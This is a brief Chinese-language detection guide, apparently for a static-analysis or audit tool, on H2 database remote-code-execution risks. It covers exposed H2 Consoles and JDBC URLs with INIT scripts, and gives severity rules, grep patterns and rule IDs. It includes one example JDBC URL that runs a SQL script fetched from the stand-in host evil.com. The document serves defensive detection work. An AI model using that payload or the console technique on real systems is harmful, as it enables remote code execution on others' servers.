# H2 数据库 RCE 判断知识

H2 嵌入式数据库的两类高危 RCE 路径：
1. **H2 Console 未授权访问**：`spring.h2.console.enabled=true` 且无认证，攻击者通过 `/h2-console` 执行 `CREATE ALIAS` 调用 Java 代码
2. **JDBC URL INIT 脚本**：`jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil.com/x.sql'`

## 判断规则

| 场景 | 严重度 |
|------|--------|
| H2 Console 启用 + 无认证 + H2 < 2.x | **CRITICAL** |
| H2 Console 启用 + 有认证但版本 < 2.x | **HIGH** |
| JDBC URL 含 INIT/RUNSCRIPT 参数 | **CRITICAL** |
| 仅测试目录中 H2 配置 | **MEDIUM** |

## 验证要点

- 用 Grep 搜索 `h2.console.enabled`、`h2-console`、`INIT=RUNSCRIPT`
- 结合 tech_profile 中的 H2 版本判断（H2 2.x 修复了部分 Console RCE）
- 检查 JDBC URL 是否来自配置文件还是用户可控输入
- 仅在 `test/` 目录或 test profile 中发现 → 风险降低
- 检查 SecurityFilterChain 是否保护了 `/h2-console/**`

`rule_id` 命名：`h2-console-exposed`、`h2-init-script`。
